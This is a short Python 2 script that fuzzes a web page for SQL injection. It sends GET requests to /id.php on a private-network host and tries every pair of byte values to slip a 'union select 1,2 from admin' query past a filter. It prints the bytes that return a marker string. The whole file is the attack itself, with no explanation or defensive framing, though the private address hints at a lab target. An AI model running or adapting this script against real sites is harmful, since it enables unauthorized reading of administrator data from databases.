import urllib2
import httplib
import re
import sys, time

url = '192.168.28.129'

for x in range(0,256):
    for i in range(0,256):
    
        payload = '/id.php?uid=1'
        payload = payload + chr(x)
    
        test= 'union%20'+chr(i)+'select%201,2%20from%20admin'
    
        conn = httplib.HTTPConnection(url)
    
        #print payload+test
    
        conn.request('GET',payload+test)
    
        res  = conn.getresponse().read()
        #print res
        if(re.search('lufei2',res)):
            print 'chr(%d)' % i
            print res




